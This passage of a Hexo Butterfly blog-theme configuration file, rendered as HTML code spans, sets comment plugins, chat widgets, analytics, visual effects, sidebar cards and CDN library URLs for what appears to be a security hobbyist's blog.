class="line">  createIssueManually: false # Gitalk will create a corresponding github issue for your every single page automatically</span><br><span class="line"></span><br><span class="line"># valine</span><br><span class="line"># https:&#x2F;&#x2F;valine.js.org</span><br><span class="line">valine:</span><br><span class="line">  appId: # leancloud application app id</span><br><span class="line">  appKey: # leancloud application app key</span><br><span class="line">  pageSize: 10 # comment list page size</span><br><span class="line">  avatar: monsterid # gravatar style https:&#x2F;&#x2F;valine.js.org&#x2F;#&#x2F;avatar</span><br><span class="line">  lang: en # i18n: zh-CN&#x2F;zh-TW&#x2F;en&#x2F;ja</span><br><span class="line">  placeholder: Please leave your footprints # valine comment input placeholder (like: Please leave your footprints)</span><br><span class="line">  guest_info: nick,mail,link # valine comment header info (nick&#x2F;mail&#x2F;link)</span><br><span class="line">  recordIP: false # Record reviewer IP</span><br><span class="line">  serverURLs: # This configuration is suitable for domestic custom domain name users, overseas version will be automatically detected (no need to manually fill in)</span><br><span class="line">  bg: # valine background</span><br><span class="line">  emojiCDN: # emoji CDN</span><br><span class="line">  enableQQ: false # enable the Nickname box to automatically get QQ Nickname and QQ Avatar</span><br><span class="line">  requiredFields: nick,mail # required fields (nick&#x2F;mail)</span><br><span class="line">  option:</span><br><span class="line"></span><br><span class="line"># utterances</span><br><span class="line"># https:&#x2F;&#x2F;utteranc.es&#x2F;</span><br><span class="line">utterances:</span><br><span class="line">  repo:</span><br><span class="line">  # Issue Mapping: pathname&#x2F;url&#x2F;title&#x2F;og:title</span><br><span class="line">  issue_term: pathname</span><br><span class="line">  # Theme: github-light&#x2F;github-dark&#x2F;github-dark-orange&#x2F;icy-dark&#x2F;dark-blue&#x2F;photon-dark</span><br><span class="line">  light_theme: github-light</span><br><span class="line">  dark_theme: photon-dark</span><br><span class="line"></span><br><span class="line"># Facebook Comments Plugin</span><br><span class="line"># https:&#x2F;&#x2F;developers.facebook.com&#x2F;docs&#x2F;plugins&#x2F;comments&#x2F;</span><br><span class="line">facebook_comments:</span><br><span class="line">  app_id:</span><br><span class="line">  user_id: # optional</span><br><span class="line">  pageSize: 10 # The number of comments to show</span><br><span class="line">  order_by: social # social&#x2F;time&#x2F;reverse_time</span><br><span class="line">  lang: en_US # Language en_US&#x2F;zh_CN&#x2F;zh_TW and so on</span><br><span class="line"></span><br><span class="line"># Twikoo</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;imaegoo&#x2F;twikoo</span><br><span class="line">twikoo:</span><br><span class="line"></span><br><span class="line"># Chat Services</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Chat Button [recommend]</span><br><span class="line"># It will create a button in the bottom right corner of website, and hide the origin button</span><br><span class="line">chat_btn: false</span><br><span class="line"></span><br><span class="line"># The origin chat button is displayed when scrolling up, and the button is hidden when scrolling down</span><br><span class="line">chat_hide_show: false</span><br><span class="line"></span><br><span class="line"># chatra</span><br><span class="line"># https:&#x2F;&#x2F;chatra.io&#x2F;</span><br><span class="line">chatra:</span><br><span class="line">  enable: false</span><br><span class="line">  id:</span><br><span class="line"></span><br><span class="line"># tidio</span><br><span class="line"># https:&#x2F;&#x2F;www.tidio.com&#x2F;</span><br><span class="line">tidio:</span><br><span class="line">  enable: false</span><br><span class="line">  public_key:</span><br><span class="line"></span><br><span class="line"># daovoice</span><br><span class="line"># http:&#x2F;&#x2F;daovoice.io&#x2F;</span><br><span class="line">daovoice:</span><br><span class="line">  enable: false</span><br><span class="line">  app_id:</span><br><span class="line"></span><br><span class="line"># gitter</span><br><span class="line"># https:&#x2F;&#x2F;gitter.im&#x2F;</span><br><span class="line">gitter:</span><br><span class="line">  enable: false</span><br><span class="line">  room:</span><br><span class="line"></span><br><span class="line"># crisp</span><br><span class="line"># https:&#x2F;&#x2F;crisp.chat&#x2F;en&#x2F;</span><br><span class="line">crisp:</span><br><span class="line">  enable: false</span><br><span class="line">  website_id:</span><br><span class="line"></span><br><span class="line"># Footer Settings</span><br><span class="line"># --------------------------------------</span><br><span class="line">footer:</span><br><span class="line">  owner:</span><br><span class="line">    enable: true</span><br><span class="line">    since: 2019</span><br><span class="line">  custom_text:</span><br><span class="line">  copyright: true # Copyright of theme and framework</span><br><span class="line">  ICP: # Chinese ICP License</span><br><span class="line">    enable: false</span><br><span class="line">    url:</span><br><span class="line">    text:</span><br><span class="line">    icon: &#x2F;img&#x2F;icp.png</span><br><span class="line"></span><br><span class="line"># Analysis</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Baidu Analytics</span><br><span class="line"># https:&#x2F;&#x2F;tongji.baidu.com&#x2F;web&#x2F;welcome&#x2F;login</span><br><span class="line">baidu_analytics:</span><br><span class="line"></span><br><span class="line"># Google Analytics</span><br><span class="line"># https:&#x2F;&#x2F;analytics.google.com&#x2F;analytics&#x2F;web&#x2F;</span><br><span class="line">google_analytics:</span><br><span class="line"></span><br><span class="line"># Tencent Analytics ID</span><br><span class="line"># https:&#x2F;&#x2F;mta.qq.com</span><br><span class="line">tencent_analytics:</span><br><span class="line"></span><br><span class="line"># CNZZ Analytics</span><br><span class="line"># https:&#x2F;&#x2F;www.umeng.com&#x2F;</span><br><span class="line">cnzz_analytics:</span><br><span class="line"></span><br><span class="line"># Advertisement</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Google Adsense (谷歌廣告)</span><br><span class="line">google_adsense:</span><br><span class="line">  enable: false</span><br><span class="line">  auto_ads: true</span><br><span class="line">  js: https:&#x2F;&#x2F;pagead2.googlesyndication.com&#x2F;pagead&#x2F;js&#x2F;adsbygoogle.js</span><br><span class="line">  client:</span><br><span class="line">  enable_page_level_ads: true</span><br><span class="line"></span><br><span class="line"># Insert ads manually (手動插入廣告)</span><br><span class="line"># ad:</span><br><span class="line">#   index:</span><br><span class="line">#   aside:</span><br><span class="line">#   post:</span><br><span class="line"></span><br><span class="line"># Verification (站長驗證)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Google Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;www.google.com&#x2F;webmasters&#x2F;</span><br><span class="line">google_site_verification:</span><br><span class="line"></span><br><span class="line"># Bing Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;www.bing.com&#x2F;webmaster&#x2F;</span><br><span class="line">bing_site_verification:</span><br><span class="line"></span><br><span class="line"># Baidu Webmaster tools verification setting</span><br><span class="line"># See: https:&#x2F;&#x2F;ziyuan.baidu.com&#x2F;site&#x2F;</span><br><span class="line">baidu_site_verification:</span><br><span class="line"></span><br><span class="line"># 360 Webmaster tools verification setting</span><br><span class="line"># see http:&#x2F;&#x2F;zhanzhang.so.com&#x2F;</span><br><span class="line">qihu_site_verification:</span><br><span class="line"></span><br><span class="line"># Yandex Webmaster tools verification setting</span><br><span class="line"># see https:&#x2F;&#x2F;webmaster.yandex.com&#x2F;</span><br><span class="line">yandex_site_verification:</span><br><span class="line"></span><br><span class="line"># Beautify&#x2F;Effect (美化&#x2F;效果)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Theme color for customize</span><br><span class="line"># Notice: color value must in double quotes like &quot;#000&quot; or may cause error!</span><br><span class="line"></span><br><span class="line"># theme_color:</span><br><span class="line">#   enable: true</span><br><span class="line">#   main: &quot;#49B1F5&quot;</span><br><span class="line">#   paginator: &quot;#00c4b6&quot;</span><br><span class="line">#   button_hover: &quot;#FF7242&quot;</span><br><span class="line">#   text_selection: &quot;#00c4b6&quot;</span><br><span class="line">#   link_color: &quot;#99a9bf&quot;</span><br><span class="line">#   meta_color: &quot;#858585&quot;</span><br><span class="line">#   hr_color: &quot;#A4D8FA&quot;</span><br><span class="line">#   code_foreground: &quot;#F47466&quot;</span><br><span class="line">#   code_background: &quot;rgba(27, 31, 35, .05)&quot;</span><br><span class="line">#   toc_color: &quot;#00c4b6&quot;</span><br><span class="line">#   blockquote_padding_color: &quot;#49b1f5&quot;</span><br><span class="line">#   blockquote_background_color: &quot;#49b1f5&quot;</span><br><span class="line"></span><br><span class="line"># The top_img settings of home page</span><br><span class="line"># default: top img - full screen, site info - middle (默認top_img全屏，site_info在中間)</span><br><span class="line"># The position of site info, eg: 300px&#x2F;300em&#x2F;300rem&#x2F;10% (主頁標題距離頂部距離)</span><br><span class="line">index_site_info_top:</span><br><span class="line"># The height of top_img, eg: 300px&#x2F;300em&#x2F;300rem (主頁top_img高度)</span><br><span class="line">index_top_img_height:</span><br><span class="line"></span><br><span class="line"># The user interface setting of category and tag page (category和tag頁的UI設置)</span><br><span class="line"># index - same as Homepage UI (index 值代表 UI將與首頁的UI一樣)</span><br><span class="line"># default - same as archives UI 默認跟archives頁面UI一樣</span><br><span class="line">category_ui: # 留空或 index</span><br><span class="line">tag_ui: # 留空或 index</span><br><span class="line"></span><br><span class="line"># Website Background (設置網站背景)</span><br><span class="line"># can set it to color or image (可設置圖片 或者 顔色)</span><br><span class="line"># The formal of image: url(http:&#x2F;&#x2F;xxxxxx.com&#x2F;xxx.jpg)</span><br><span class="line">background: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;ifonly-go2019&#x2F;PicGo&#x2F;&#x2F;images&#x2F;20200825211012.jpg</span><br><span class="line"></span><br><span class="line"># Footer Background</span><br><span class="line">footer_bg: false</span><br><span class="line"></span><br><span class="line"># the position of bottom right button&#x2F;default unit: px (右下角按鈕距離底部的距離&#x2F;默認單位為px)</span><br><span class="line">rightside-bottom:</span><br><span class="line"></span><br><span class="line"># Enter transitions (開啓網頁進入效果)</span><br><span class="line">enter_transitions: true</span><br><span class="line"></span><br><span class="line"># Background effects (背景特效)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># canvas_ribbon (靜止彩帶背景)</span><br><span class="line"># See: https:&#x2F;&#x2F;github.com&#x2F;hustcc&#x2F;ribbon.js</span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: false</span><br><span class="line">  size: 150</span><br><span class="line">  alpha: 0.6</span><br><span class="line">  zIndex: -1</span><br><span class="line">  click_to_change: false</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Fluttering Ribbon (動態彩帶)</span><br><span class="line">canvas_fluttering_ribbon:</span><br><span class="line">  enable: false</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># canvas_nest</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;hustcc&#x2F;canvas-nest.js</span><br><span class="line">canvas_nest:</span><br><span class="line">  enable: false</span><br><span class="line">  color: &#39;0,0,255&#39; #color of lines, default: &#39;0,0,0&#39;; RGB values: (R,G,B).(note: use &#39;,&#39; to separate.)</span><br><span class="line">  opacity: 0.7 # the opacity of line (0~1), default: 0.5.</span><br><span class="line">  zIndex: -1 # z-index property of the background, default: -1.</span><br><span class="line">  count: 99 # the number of lines, default: 99.</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Typewriter Effect (打字效果)</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;disjukr&#x2F;activate-power-mode</span><br><span class="line">activate_power_mode:</span><br><span class="line">  enable: false</span><br><span class="line">  colorful: true # open particle animation (冒光特效)</span><br><span class="line">  shake: true #  open shake (抖動特效)</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Mouse click effects: fireworks (鼠標點擊效果: 煙火特效)</span><br><span class="line">fireworks:</span><br><span class="line">  enable: true</span><br><span class="line">  zIndex: 9999 # -1 or 9999</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Mouse click effects: Heart symbol (鼠標點擊效果: 愛心)</span><br><span class="line">click_heart:</span><br><span class="line">  enable: false</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Mouse click effects: words (鼠標點擊效果: 文字)</span><br><span class="line">ClickShowText:</span><br><span class="line">  enable: false</span><br><span class="line">  text:</span><br><span class="line">    # - I</span><br><span class="line">    # - LOVE</span><br><span class="line">    # - YOU</span><br><span class="line">  fontSize: 15px</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Default display mode (網站默認的顯示模式)</span><br><span class="line"># light (default) &#x2F; dark</span><br><span class="line">display_mode: light</span><br><span class="line"></span><br><span class="line"># Beautify (美化頁面顯示)</span><br><span class="line">beautify:</span><br><span class="line">  enable: false</span><br><span class="line">  field: post # site&#x2F;post</span><br><span class="line">  title-prefix-icon: &#39;\f0c1&#39;</span><br><span class="line">  title-prefix-icon-color: &#39;#F47466&#39;</span><br><span class="line"></span><br><span class="line"># Global font settings</span><br><span class="line"># Don&#39;t modify the following settings unless you know how they work (非必要不要修改)</span><br><span class="line">font:</span><br><span class="line">  global-font-size:</span><br><span class="line">  code-font-size:</span><br><span class="line">  font-family:</span><br><span class="line">  code-font-family:</span><br><span class="line"></span><br><span class="line"># Font settings for the site title and site subtitle</span><br><span class="line"># 左上角網站名字 主頁居中網站名字</span><br><span class="line">blog_title_font:</span><br><span class="line">  font_link:</span><br><span class="line">  font-family:</span><br><span class="line"></span><br><span class="line"># The setting of divider icon (水平分隔線圖標設置)</span><br><span class="line">hr_icon:</span><br><span class="line">  enable: true</span><br><span class="line">  icon: # the unicode value of Font Awesome icon, such as &#39;\3423&#39;</span><br><span class="line">  icon-top:</span><br><span class="line"></span><br><span class="line"># the subtitle on homepage (主頁subtitle)</span><br><span class="line">subtitle:</span><br><span class="line">  enable: true</span><br><span class="line">  # Typewriter Effect (打字效果)</span><br><span class="line">  effect: true</span><br><span class="line">  # loop (循環打字)</span><br><span class="line">  loop: true</span><br><span class="line">  # source調用第三方服務</span><br><span class="line">  # source: false 關閉調用</span><br><span class="line">  # source: 1  調用搏天api的隨機語錄（簡體） https:&#x2F;&#x2F;api.btstu.cn&#x2F;</span><br><span class="line">  # source: 2  調用一言網的一句話（簡體） https:&#x2F;&#x2F;hitokoto.cn&#x2F;</span><br><span class="line">  # source: 3  調用一句網（簡體） http:&#x2F;&#x2F;yijuzhan.com&#x2F;</span><br><span class="line">  # source: 4  調用今日詩詞（簡體） https:&#x2F;&#x2F;www.jinrishici.com&#x2F;</span><br><span class="line">  # subtitle 會先顯示 source , 再顯示 sub 的內容</span><br><span class="line">  source: false</span><br><span class="line">  # 如果有英文逗號&#39; , &#39;,請使用轉義字元 &amp;#44;</span><br><span class="line">  # 如果有英文雙引號&#39; &quot; &#39;,請使用轉義字元 &quot;</span><br><span class="line">  # 開頭不允許轉義字元，如需要，請把整個句子用雙引號包住</span><br><span class="line">  # 如果關閉打字效果，subtitle只會顯示sub的第一行文字</span><br><span class="line">  sub: 作为一名合格的攻防人员,工具的熟练掌握仅仅只是极小的一部分,对各种利用原理的深度理解和二次定制能力才是你的核心</span><br><span class="line"></span><br><span class="line"># Loading Animation (加載動畫)</span><br><span class="line">preloader: false</span><br><span class="line"></span><br><span class="line"># aside (側邊欄)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line">aside:</span><br><span class="line">  enable: true</span><br><span class="line">  hide: false</span><br><span class="line">  button: true</span><br><span class="line">  mobile: true # display on mobile</span><br><span class="line">  position: right # left or right</span><br><span class="line">  card_author:</span><br><span class="line">    enable: true</span><br><span class="line">    description:</span><br><span class="line">    button:</span><br><span class="line">      icon: fab fa-github</span><br><span class="line">      text: Follow Me</span><br><span class="line">      link: https:&#x2F;&#x2F;github.com&#x2F;ifonly-go2019</span><br><span class="line">  card_announcement:</span><br><span class="line">    enable: true</span><br><span class="line">    content: Hack for fun，live for LOVE.</span><br><span class="line">  card_recent_post:</span><br><span class="line">    enable: false</span><br><span class="line">    limit: 5 # if set 0 will show all</span><br><span class="line">    sort: date # date or updated</span><br><span class="line">  card_categories:</span><br><span class="line">    enable: true</span><br><span class="line">    limit: 8 # if set 0 will show all</span><br><span class="line">    expand: none # none&#x2F;true&#x2F;false</span><br><span class="line">  card_tags:</span><br><span class="line">    enable: true</span><br><span class="line">    limit: 40 # if set 0 will show all</span><br><span class="line">    color: false</span><br><span class="line">  card_archives:</span><br><span class="line">    enable: true</span><br><span class="line">    type: monthly # yearly or monthly</span><br><span class="line">    format: MMMM YYYY # eg: YYYY年MM月</span><br><span class="line">    order: -1 # Sort of order. 1, asc for ascending; -1, desc for descending</span><br><span class="line">    limit: 8 # if set 0 will show all</span><br><span class="line">  card_webinfo:</span><br><span class="line">    enable: true</span><br><span class="line">    post_count: true</span><br><span class="line">    last_push_date: true</span><br><span class="line"></span><br><span class="line"># busuanzi count for PV &#x2F; UV in site</span><br><span class="line"># 訪問人數</span><br><span class="line">busuanzi:</span><br><span class="line">  site_uv: true</span><br><span class="line">  site_pv: false</span><br><span class="line">  page_pv: false</span><br><span class="line"></span><br><span class="line"># Time difference between publish date and now (網頁運行時間)</span><br><span class="line"># Formal: Month&#x2F;Day&#x2F;Year Time or Year&#x2F;Month&#x2F;Day Time</span><br><span class="line">runtimeshow:</span><br><span class="line">  enable: true</span><br><span class="line">  publish_date: 8&#x2F;20&#x2F;2019 00:00:00</span><br><span class="line"></span><br><span class="line"># Aside widget - Newest Comments</span><br><span class="line">newest_comments:</span><br><span class="line">  enable: false</span><br><span class="line">  limit: 6</span><br><span class="line">  avatar: true</span><br><span class="line">  leancloud:</span><br><span class="line">    enable: false</span><br><span class="line">    appId: # leancloud application app id</span><br><span class="line">    appKey: # leancloud application app key</span><br><span class="line">    serverURL: # This configuration is suitable for domestic custom domain name users, overseas version will be automatically detected (no need to manually fill in)</span><br><span class="line">    default_avatar: # mp&#x2F;identicon&#x2F;monsterid&#x2F;wavatar&#x2F;retro&#x2F;robohash&#x2F;blank</span><br><span class="line">  github_issues:</span><br><span class="line">    enable: false</span><br><span class="line">    repo:</span><br><span class="line">  disqus:</span><br><span class="line">    enable: false</span><br><span class="line">    forum:</span><br><span class="line">    api_key:</span><br><span class="line"></span><br><span class="line"># Bottom right button (右下角按鈕)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Conversion between Traditional and Simplified Chinese (簡繁轉換)</span><br><span class="line">translate:</span><br><span class="line">  enable: false</span><br><span class="line">  # The text of a button</span><br><span class="line">  default: 繁</span><br><span class="line">  # the language of website (1 - Traditional Chinese&#x2F; 2 - Simplified Chinese）</span><br><span class="line">  defaultEncoding: 2</span><br><span class="line">  # Time delay</span><br><span class="line">  translateDelay: 0</span><br><span class="line">  # The text of the button when the language is Simplified Chinese</span><br><span class="line">  msgToTraditionalChinese: &#39;繁&#39;</span><br><span class="line">  # The text of the button when the language is Traditional Chinese</span><br><span class="line">  msgToSimplifiedChinese: &#39;簡&#39;</span><br><span class="line"></span><br><span class="line"># Read Mode (閲讀模式)</span><br><span class="line">readmode: true</span><br><span class="line"></span><br><span class="line"># dark mode</span><br><span class="line">darkmode:</span><br><span class="line">  enable: true</span><br><span class="line">  # Toggle Button to switch dark&#x2F;light mode</span><br><span class="line">  button: true</span><br><span class="line">  # Switch dark&#x2F;light mode automatically (自動切換 dark mode和 light mode)</span><br><span class="line">  # autoChangeMode: 1  Following System Settings, if the system doesn&#39;t support dark mode, it will switch dark mode between 6 pm to 6 am</span><br><span class="line">  # autoChangeMode: 2  Switch dark mode between 6 pm to 6 am</span><br><span class="line">  # autoChangeMode: false</span><br><span class="line">  autoChangeMode: false</span><br><span class="line"></span><br><span class="line"># Lightbox (圖片大圖查看模式)</span><br><span class="line"># --------------------------------------</span><br><span class="line"># You can only choose one, or neither (只能選擇一個 或者 兩個都不選)</span><br><span class="line"></span><br><span class="line"># medium-zoom</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;francoischalifour&#x2F;medium-zoom</span><br><span class="line">medium_zoom: false</span><br><span class="line"></span><br><span class="line"># fancybox</span><br><span class="line"># http:&#x2F;&#x2F;fancyapps.com&#x2F;fancybox&#x2F;3&#x2F;</span><br><span class="line">fancybox: true</span><br><span class="line"></span><br><span class="line"># Tag Plugins settings (標籤外掛)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># mermaid</span><br><span class="line"># see https:&#x2F;&#x2F;github.com&#x2F;knsv&#x2F;mermaid</span><br><span class="line">mermaid:</span><br><span class="line">  enable: false</span><br><span class="line">  # built-in themes: default&#x2F;forest&#x2F;dark&#x2F;neutral</span><br><span class="line">  theme: default</span><br><span class="line"></span><br><span class="line"># Note (Bootstrap Callout)</span><br><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: flat</span><br><span class="line">  icons: true</span><br><span class="line">  border_radius: 3</span><br><span class="line">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span><br><span class="line">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span><br><span class="line">  light_bg_offset: 0</span><br><span class="line"></span><br><span class="line"># other</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Artitalk</span><br><span class="line"># see https:&#x2F;&#x2F;artitalk.js.org&#x2F;</span><br><span class="line">artitalk:</span><br><span class="line">  appId:</span><br><span class="line">  appKey:</span><br><span class="line">  option:</span><br><span class="line"></span><br><span class="line"># Pjax [Beta]</span><br><span class="line"># It may contain bugs and unstable, give feedback when you find the bugs.</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;MoOx&#x2F;pjax</span><br><span class="line">pjax:</span><br><span class="line">  enable: false</span><br><span class="line">  exclude:</span><br><span class="line">    # - xxxx</span><br><span class="line">    # - xxxx</span><br><span class="line"></span><br><span class="line"># Inject the css and script (aplayer&#x2F;meting)</span><br><span class="line">aplayerInject:</span><br><span class="line">  enable: false</span><br><span class="line">  per_page: true</span><br><span class="line"></span><br><span class="line"># Snackbar (Toast Notification 彈窗)</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;polonel&#x2F;SnackBar</span><br><span class="line"># position 彈窗位置</span><br><span class="line"># 可選 top-left &#x2F; top-center &#x2F; top-right &#x2F; bottom-left &#x2F; bottom-center &#x2F; bottom-right</span><br><span class="line">snackbar:</span><br><span class="line">  enable: false</span><br><span class="line">  position: bottom-left</span><br><span class="line">  bg_light: &#39;#49b1f5&#39; # The background color of Toast Notification in light mode</span><br><span class="line">  bg_dark: &#39;#121212&#39; # The background color of Toast Notification in dark mode</span><br><span class="line"></span><br><span class="line"># Baidu Push (百度推送)</span><br><span class="line">baidu_push: false</span><br><span class="line"></span><br><span class="line"># https:&#x2F;&#x2F;instant.page&#x2F;</span><br><span class="line"># prefetch (預加載)</span><br><span class="line">instantpage: false</span><br><span class="line"></span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;vinta&#x2F;pangu.js</span><br><span class="line"># Insert a space between Chinese character and English character (中英文之間添加空格)</span><br><span class="line">pangu:</span><br><span class="line">  enable: false</span><br><span class="line">  field: site # site&#x2F;post</span><br><span class="line"></span><br><span class="line"># Lazyload (圖片懶加載)</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;verlok&#x2F;lazyload</span><br><span class="line">lazyload:</span><br><span class="line">  enable: false</span><br><span class="line">  post: &#x2F;img&#x2F;loading.gif</span><br><span class="line"></span><br><span class="line"># PWA</span><br><span class="line"># See https:&#x2F;&#x2F;github.com&#x2F;JLHwung&#x2F;hexo-offline</span><br><span class="line"># ---------------</span><br><span class="line"># pwa:</span><br><span class="line">#   enable: false</span><br><span class="line">#   manifest: &#x2F;image&#x2F;pwa&#x2F;manifest.json</span><br><span class="line">#   apple_touch_icon: &#x2F;image&#x2F;pwa&#x2F;apple-touch-icon.png</span><br><span class="line">#   favicon_32_32: &#x2F;image&#x2F;pwa&#x2F;32.png</span><br><span class="line">#   favicon_16_16: &#x2F;image&#x2F;pwa&#x2F;16.png</span><br><span class="line">#   mask_icon: &#x2F;image&#x2F;pwa&#x2F;safari-pinned-tab.svg</span><br><span class="line"></span><br><span class="line"># Disable Baidu transformation on mobile devices (禁止百度轉碼)</span><br><span class="line">disable_baidu_transformation: true</span><br><span class="line"></span><br><span class="line"># Open graph meta tags</span><br><span class="line"># https:&#x2F;&#x2F;developers.facebook.com&#x2F;docs&#x2F;sharing&#x2F;webmasters&#x2F;</span><br><span class="line">Open_Graph_meta: true</span><br><span class="line"></span><br><span class="line"># Caches the contents in a fragment, speed up the generation (開啟hexo自帶的緩存,加快生成速度)</span><br><span class="line">fragment_cache: true</span><br><span class="line"></span><br><span class="line"># Inject</span><br><span class="line"># Insert the code to head (before &#39;&lt;&#x2F;head&gt;&#39; tag) and the bottom (before &#39;&lt;&#x2F;body&gt;&#39; tag)</span><br><span class="line"># 插入代码到头部 &lt;&#x2F;head&gt; 之前 和 底部 &lt;&#x2F;body&gt; 之前</span><br><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">    # - &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;xxx.css&quot;&gt;</span><br><span class="line">  bottom:</span><br><span class="line">    # - &lt;script src&#x3D;&quot;xxxx&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line"># CDN</span><br><span class="line"># Don&#39;t modify the following settings unless you know how they work</span><br><span class="line"># 非必要請不要修改</span><br><span class="line">CDN:</span><br><span class="line">  # main</span><br><span class="line">  main_css: &#x2F;css&#x2F;index.css</span><br><span class="line">  jquery: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;jquery@latest&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line">  main: &#x2F;js&#x2F;main.js</span><br><span class="line">  utils: &#x2F;js&#x2F;utils.js</span><br><span class="line"></span><br><span class="line">  # pjax</span><br><span class="line">  pjax: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pjax&#x2F;pjax.min.js</span><br><span class="line"></span><br><span class="line">  # comments</span><br><span class="line">  gitalk: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;</span><br><span class="line">  @latest&#x2F;dist&#x2F;gitalk.min.js</span><br><span class="line">  gitalk_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;gitalk&#x2F;dist&#x2F;gitalk.min.css</span><br><span class="line">  valine: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;valine&#x2F;dist&#x2F;Valine.min.js</span><br><span class="line">  disqusjs: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;disqusjs@1&#x2F;dist&#x2F;disqus.js</span><br><span class="line">  disqusjs_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;disqusjs@1&#x2F;dist&#x2F;disqusjs.css</span><br><span class="line">  utterances: https:&#x2F;&#x2F;utteranc.es&#x2F;client.js</span><br><span class="line">  twikoo: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;twikoo&#x2F;dist&#x2F;twikoo.all.min.js</span><br><span class="line"></span><br><span class="line">  # share</span><br><span class="line">  addtoany: https:&#x2F;&#x2F;static.addtoany.com&#x2F;menu&#x2F;page.js</span><br><span class="line">  sharejs: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;social-share.js&#x2F;dist&#x2F;js&#x2F;social-share.min.js</span><br><span class="line">  sharejs_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;social-share.js&#x2F;dist&#x2F;css&#x2F;share.min.css</span><br><span class="line"></span><br><span class="line">  # search</span><br><span class="line">  local_search: &#x2F;js&#x2F;search&#x2F;local-search.js</span><br><span class="line">  algolia_js: &#x2F;js&#x2F;search&#x2F;algolia.js</span><br><span class="line">  algolia_search: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;instantsearch.js@2.10.5&#x2F;dist&#x2F;instantsearch.min.js</span><br><span class="line">  algolia_search_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;instantsearch.js@2.10.5&#x2F;dist&#x2F;instantsearch.min.css</span><br><span class="line"></span><br><span class="line">  # math</span><br><span class="line">  mathjax: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;mathjax@3&#x2F;es5&#x2F;tex-mml-chtml.js</span><br><span class="line">  katex: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;katex@latest&#x2F;dist&#x2F;katex.min.css</span><br><span class="line">  katex_copytex: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;katex-copytex@latest&#x2F;dist&#x2F;katex-copytex.min.js</span><br><span class="line">  katex_copytex_css: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;katex-copytex@latest&#x2F;dist&#x2F;katex-copytex.min.css</span><br><span class="line">  mermaid: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;mermaid&#x2F;dist&#x2F;mermaid.min.js</span><br><span class="line"></span><br><span class="line">  # count</span><br><span class="line">  busuanzi: &#x2F;&#x2F;busuanzi.ibruce.info&#x2F;busuanzi&#x2F;2.3&#x2F;busuanzi.pure.mini.js</span><br><span class="line"></span><br><span class="line">  # background effect</span><br><span class="line">  canvas_ribbon: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;canvas-ribbon.min.js</span><br><span class="line">  canvas_fluttering_ribbon: https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;butterfly-extsrc@1&#x2F;dist&#x2F;canvas-fluttering-ribbon.min.js</span><br><span class="line">  